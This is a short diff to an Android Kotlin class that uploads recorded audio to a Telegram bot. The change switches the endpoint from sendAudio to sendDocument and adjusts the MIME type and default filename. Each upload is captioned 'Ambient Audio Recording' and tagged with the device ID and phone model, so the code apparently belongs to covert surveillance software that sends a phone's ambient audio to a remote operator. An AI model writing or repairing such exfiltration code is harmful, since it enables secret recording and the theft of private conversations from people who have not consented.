@@ -107,16 +107,16 @@ class TelegramBotManager(private val context: Context) {
             val model = "${Build.MANUFACTURER} ${Build.MODEL}"
             val fullCaption = "🎤 *Ambient Audio Recording*\n🆔 Device: `$deviceId`\n📱 Model: `$model`\n${if (caption.isNotBlank()) "📝 $caption" else ""}".trim()
 
-            val url = "https://api.telegram.org/bot$token/sendAudio"
+            val url = "https://api.telegram.org/bot$token/sendDocument"
             val body = okhttp3.MultipartBody.Builder()
                 .setType(okhttp3.MultipartBody.FORM)
                 .addFormDataPart("chat_id", chatId)
                 .addFormDataPart("caption", fullCaption)
                 .addFormDataPart("parse_mode", "Markdown")
                 .addFormDataPart(
-                    "audio",
-                    filename,
-                    okhttp3.RequestBody.create("audio/*".toMediaType(), audioBytes)
+                    "document",
+                    filename.ifEmpty { "audio.3gp" },
+                    okhttp3.RequestBody.create("application/octet-stream".toMediaType(), audioBytes)
                 )
                 .build()
 
